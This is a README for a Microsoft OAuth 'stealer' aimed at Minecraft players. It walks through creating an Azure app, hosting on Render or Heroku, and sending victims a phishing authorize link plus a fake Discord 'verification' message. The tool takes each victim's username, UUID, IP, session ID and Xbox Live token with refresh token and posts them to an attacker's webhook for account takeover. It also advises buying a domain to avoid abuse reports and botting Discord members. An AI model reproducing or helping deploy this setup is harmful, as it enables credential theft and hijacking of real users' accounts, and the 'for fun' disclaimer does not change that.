
# Microsoft Oauth Stealer

This Oauth basically verifies you with Microsoft - Oauth and sends your IGN, UUID, IP, SSID, & XBL Token WIth Refresher thru post request. You can acess their account for 14 days.

#### How to start
 - Just fork this repo

## Features

- IGN
- UUID
- SSID
- IP
- XBL TOKEN
- XBL REFRESHER

## Azure Setup
Go to 
- https://azure.microsoft.com/
 
 and sign up  you need atleast 1$ at paypal or on ur card
 and then create an application copy client id &  client secret
## Environment Variables

To run this project, you will need to add the following environment variables to your .env file or config variables

- `CLIENT_SECRET` `CLIENT_ID` `REDIRECT_URI` `WEBHOOK_URL`



## Deployment

To deploy this & project running

#### You Can Host Them At
- https://render.com 
- https://heroku.com

render is free and heroku is paid both are good
i recommend to buy a domain and to this
so they cant report to ur webservice admin 

For Heroku ill implement the procfile file there so you just deploy without build & start command 

## For Render build & start command

```bash
npm install
```
```bash
node .
```

## How to use
`https://login.live.com/oauth20_authorize.srf?client_id=[YOURCLIENT_ID]&response_type=code&redirect_uri=[YOUR_HEROKU_OR_RENDER_LINK]&scope=XboxLive.signin+offline_access&state=OK`
## Discord Server Setup
- https://beta.tokenu.net
You can bot server members there


and then create a webhook on the channel where u wanna send the verification message
and then go to 
- https://discohook.org

Paste the webhook link there and then click on JSON Data Editor 
![App Screenshot](https://media.discordapp.net/attachments/1035831932602294343/1047808729720045638/image.png?width=616&height=600)

Paste all text from data.JSON i implemented the data.json in repo check
and then you add your O auth link in ()


## Disclaimer
This Stealer was just made for fun dont use it for malicious purposes
im not responsible for any kind of harm causes by this tool.

![Logo](https://media.discordapp.net/attachments/1035831932602294343/1047799481778851860/Oauth.png?width=945&height=532)
